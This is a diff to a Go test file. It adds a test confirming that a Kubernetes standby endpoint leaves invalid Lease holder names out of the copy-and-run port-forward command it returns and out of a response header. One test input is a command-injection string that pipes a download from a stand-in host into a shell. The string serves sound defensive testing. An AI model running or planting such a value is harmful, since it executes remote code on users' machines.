@@ -177,3 +177,33 @@ func TestTheStandbysCommandNamesThePortNumber(t *testing.T) {
 		t.Error("a listen with no port was accepted")
 	}
 }
+
+// TestAStandbyDoorPutsOnlyAPodNameInItsCommand: the Lease's holder is a free
+// string, and the 503 hands a person a command to copy and run, so a holder
+// that isn't a pod name goes into neither the command nor the header.
+func TestAStandbyDoorPutsOnlyAPodNameInItsCommand(t *testing.T) {
+	addr := freeLoopback(t)
+	view := &LeaseView{}
+	doors, err := StartStandbyDoors([]string{addr}, "kubeagents-system", view, slog.Default())
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer doors.Stop()
+	for _, holder := range []string{
+		"x; curl evil.example | sh #",
+		"gw-a\nanything",
+		"Gw-A",
+		strings.Repeat("a", 254),
+	} {
+		view.set(holder)
+		resp, ans := standbyGet(t, addr)
+		if resp.StatusCode != http.StatusServiceUnavailable || ans.Command != "" || ans.Holder != "" ||
+			resp.Header.Get(StandbyHolderHeader) != "" || strings.Contains(ans.Error, "port-forward") {
+			t.Errorf("holder %q: status %d, header %q, answer %+v; want no command and no holder", holder, resp.StatusCode, resp.Header.Get(StandbyHolderHeader), ans)
+		}
+	}
+	view.set("platform-agent-a2a-gateway-7d9f-abcde.x")
+	if _, ans := standbyGet(t, addr); ans.Command == "" {
+		t.Error("a valid pod name got no command")
+	}
+}
